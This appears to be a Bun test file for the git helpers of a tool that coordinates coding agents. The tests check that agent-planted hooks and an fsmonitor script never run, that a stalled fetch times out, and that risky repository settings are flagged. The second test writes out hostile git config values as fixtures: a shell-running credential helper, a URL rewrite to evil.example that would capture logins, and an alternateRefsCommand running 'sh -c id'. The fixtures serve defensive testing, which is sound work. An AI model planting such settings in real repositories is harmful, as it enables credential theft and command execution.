import { afterAll, describe, expect, it } from "bun:test";
import { execFileSync } from "node:child_process";
import { chmodSync, existsSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { commitAll, ensureWorktree, isClean, riskySettings } from "../src/git.js";

const temp = mkdtempSync(join(tmpdir(), "petrina-git-"));
const git = (cwd: string, ...args: string[]) => execFileSync("git", args, { cwd }).toString().trim();

describe("Petrina's own git steps", () => {
  afterAll(() => rmSync(temp, { recursive: true, force: true }));

  it("never run hooks or the file monitor an agent planted", async () => {
    const repo = join(temp, "repo");
    execFileSync("mkdir", ["-p", repo]);
    git(repo, "init", "-q", "-b", "main");
    git(repo, "config", "user.email", "test@example.com");
    git(repo, "config", "user.name", "Test");
    const marker = join(temp, "ran");
    const script = join(temp, "evil.sh");
    writeFileSync(script, `#!/bin/sh\ntouch ${marker}\n`);
    chmodSync(script, 0o755);
    writeFileSync(join(repo, ".git", "hooks", "pre-commit"), `#!/bin/sh\ntouch ${marker}\n`);
    chmodSync(join(repo, ".git", "hooks", "pre-commit"), 0o755);
    git(repo, "config", "core.fsmonitor", script);
    writeFileSync(join(repo, "a.txt"), "hello\n");

    expect(await isClean(repo)).toBe(false);
    expect(await commitAll(repo, "Add a")).toMatch(/^[0-9a-f]{40}$/);
    expect(existsSync(marker)).toBe(false);
  });

  it("will not fetch with the coordinator's login when the repository's settings could misuse it", async () => {
    const repo = join(temp, "risky");
    execFileSync("mkdir", ["-p", repo]);
    git(repo, "init", "-q", "-b", "main");
    git(repo, "remote", "add", "origin", "https://github.com/acme/shop.git");
    git(repo, "config", "branch.main.remote", "origin");
    git(repo, "config", "core.hooksPath", ".husky");
    expect(await riskySettings(repo)).toEqual([]);
    git(repo, "config", "credential.helper", "!sh -c 'touch /tmp/stolen'");
    git(repo, "config", "url.https://evil.example/.insteadOf", "https://github.com/");
    git(repo, "config", "http.extraHeader", "X-Leak: 1");
    git(repo, "config", "core.alternateRefsCommand", "sh -c id");
    expect((await riskySettings(repo)).sort()).toEqual(["core.alternaterefscommand", "credential.helper", "http.extraheader", "url.https://evil.example/.insteadof"]);
  });

  it("never waits on a stalled fetch: it works from the local copy", async () => {
    const origin = join(temp, "origin");
    execFileSync("mkdir", ["-p", origin]);
    git(origin, "init", "-q", "-b", "main");
    git(origin, "config", "user.email", "test@example.com");
    git(origin, "config", "user.name", "Test");
    writeFileSync(join(origin, "a.txt"), "a\n");
    git(origin, "add", ".");
    git(origin, "commit", "-q", "-m", "init");
    // An https remote that accepts the connection and never answers.
    const server = Bun.listen({ hostname: "127.0.0.1", port: 0, socket: { data() {} } });
    git(origin, "remote", "add", "origin", `https://127.0.0.1:${server.port}/acme/shop.git`);
    const started = Date.now();
    const result = await ensureWorktree(origin, join(temp, "wt"), "petrina/x", "main", 1500);
    server.stop(true);
    expect(Date.now() - started).toBeLessThan(10_000);
    expect(result.fetchTimedOut).toBe(true);
    expect(result.base).toBe("main");
    expect(existsSync(join(temp, "wt", "a.txt"))).toBe(true);
  });
});
